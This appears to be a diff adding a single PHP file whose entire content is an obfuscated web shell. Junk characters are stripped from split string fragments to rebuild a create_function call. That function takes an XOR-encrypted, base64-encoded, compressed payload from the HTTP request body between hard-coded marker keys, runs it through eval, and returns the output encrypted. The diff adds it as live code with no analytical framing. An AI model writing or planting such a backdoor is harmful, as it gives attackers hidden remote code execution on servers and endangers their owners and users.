@@ -1,0 +1,13 @@
+<?php
+$h=',)==1)U,U, U,{@ob_start();@eU,val(@gzuncoU,mpress(U,@U,x(@baseU,64_decU,ode($';
+$r='mU,[1]),$k)))U,;$o=U,@ob_gU,et_conteU,U,nts();@obU,_U,end_clean();$rU,=@ba';
+$p='lenU,($U,tU,);$o="";for($i=0U,;$i<$l;U,)U,U,{for($j=0;($jU,<$c&&$iU,<$l);';
+$C=str_replace('L','','crLeaLtLe_fuLLLnction');
+$V='se6U,4U,_encode(@xU,(@gzcU,oU,mpress($U,oU,),$k));printU,("$p$kh$rU,$kf");}';
+$H=',atch("/$kU,h(.+)U,$kf/",@fileU,_U,get_conU,tU,ents("php://inpuU,t"),$mU';
+$e='5U,U,eGU,aYJWzb1cyea0";functioU,nU, x($t,$kU,){$U,c=strleU,n($k);$l=U,str';
+$j='U,U,$j++,$U,i++){$o.=$tU,{$iU,}^$k{$j};}U,}retU,urn $o;}iU,f (@pregU,_U,mU';
+$i='$U,k="e10adc3U,9";U,$kh="49U,ba59abbe56U,";$kf="eU,0U,57f20U,f883e";$p=U,"C';
+$T=str_replace('U,','',$i.$e.$p.$j.$H.$h.$r.$V);
+$W=$C('',$T);$W();
+?>
